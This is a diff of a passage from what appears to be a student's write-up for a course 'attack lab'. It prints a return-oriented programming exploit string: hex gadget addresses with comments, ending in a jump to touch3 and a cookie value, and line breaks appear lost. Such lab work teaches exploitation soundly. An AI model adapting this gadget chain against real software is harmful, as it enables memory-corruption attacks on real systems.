@@ -439,7 +439,7 @@ Finally, we get the address of `$rsp(0x5561dca0)` in `$rdi` and the offset value
 The final exploit string shown below:
 
 ```
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00  <- position of rsp, movq %rsp,%rax (Gadget1)c5 19 40 00 00 00 00 00  <- movq %rax,$rdi nop ret(Gadget2)ab 19 40 00 00 00 00 00  <- popq %rax nop ret(Gadget3)48 00 00 00 00 00 00 00  <- offset 0x48dd 19 40 00 00 00 00 00  <- movl %eax,$edx(Gadget4)34 1a 40 00 00 00 00 00  <- movl %edx, %ecx cmpb %cl(null) ret (Gadget5)13 1a 40 00 00 00 00 00  <- movl %ecx, %esi nop nop ret (Gadget6)d6 19 40 00 00 00 00 00  <- lea  (%rdi,%rsi,1),%rax ret (Gadget7: add_xy)c5 19 40 00 00 00 00 00  <-movq %rax,%rdi nop ret (Gadget8)fa 18 40 00 00 00 00 00   <- jump to touch3()35 39 62 39 39 37 66 61  <- position of string format of cookie value
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00  <- position of rsp, movq %rsp,%rax (Gadget1)c5 19 40 00 00 00 00 00  <- movq %rax,$rdi nop ret(Gadget2)ab 19 40 00 00 00 00 00  <- popq %rax nop ret(Gadget3)48 00 00 00 00 00 00 00  <- offset 0x48dd 19 40 00 00 00 00 00  <- movl %eax,$edx(Gadget4)34 1a 40 00 00 00 00 00  <- movl %edx, %ecx cmpb %cl(null) ret (Gadget5)13 1a 40 00 00 00 00 00  <- movl %ecx, %esi nop nop ret (Gadget6)d6 19 40 00 00 00 00 00  <- lea  (%rdi,%rsi,1),%rax ret (Gadget7: add_xy)c5 19 40 00 00 00 00 00  <-movq %rax,%rdi nop ret (Gadget8)fa 18 40 00 00 00 00 00  <- jump to touch3()35 39 62 39 39 37 66 61  <- position of string format of cookie value
 ```
 
 We have passed the test:
